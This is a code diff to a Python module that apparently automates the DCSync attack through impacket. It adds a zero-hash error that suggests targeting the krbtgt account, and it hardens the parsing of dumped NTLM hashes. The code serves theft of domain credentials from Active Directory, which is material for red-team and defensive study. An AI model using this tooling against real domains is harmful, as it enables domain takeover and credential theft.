@@ -85,6 +85,14 @@ def run_dcsync(
                 duration=time.monotonic() - start,
             )
 
+        if parsed["total_hashes"] == 0:
+            return _error(
+                "DCSync succeeded but dumped 0 hashes — "
+                "try: -just-dc-user krbtgt (check DA rights and target_user spelling)",
+                stderr=result.stderr,
+                duration=time.monotonic() - start,
+            )
+
         return {
             "technique_id": TECHNIQUE_ID,
             "technique_name": TECHNIQUE_NAME,
@@ -116,18 +124,38 @@ def _parse(stdout, stderr, returncode):
     for line in stdout.splitlines():
         stripped = line.strip()
 
-        if "DRSUAPI" in stripped or "Dumping Domain Credentials" in stripped:
+        # Section-header triggers. Now includes the lowercase-normalized
+        # "Using the DRSUAPI method" banner that full -just-dc dumps emit,
+        # so the older "DRSUAPI" / "Dumping Domain Credentials" checks
+        # still work but aren't the only way in.
+        lowered = stripped.lower()
+        if (
+            "drsuapi" in lowered
+            or "dumping domain credentials" in lowered
+            or "using the drsuapi method" in lowered
+        ):
             in_ntds = True
             continue
 
-        if not in_ntds:
+        if not stripped:
             continue
 
-        # Skip info/cleanup lines
-        if stripped.startswith("[") or not stripped:
+        # Skip impacket's own info/cleanup lines (prefixed with '[')
+        if stripped.startswith("["):
             continue
 
+        # Fallback: if we hit a valid NTLM line and never saw a banner,
+        # flip in_ntds on and process *this* line. This is the fix for
+        # `-just-dc-user krbtgt` targeted runs, which can go straight to
+        # the hash line without emitting a section header.
         m = NTLM_LINE_RE.match(stripped)
+        if not in_ntds:
+            if m:
+                in_ntds = True
+                # fall through to emit this entry
+            else:
+                continue
+
         if m:
             name = m.group("name")
             rid = int(m.group("rid"))
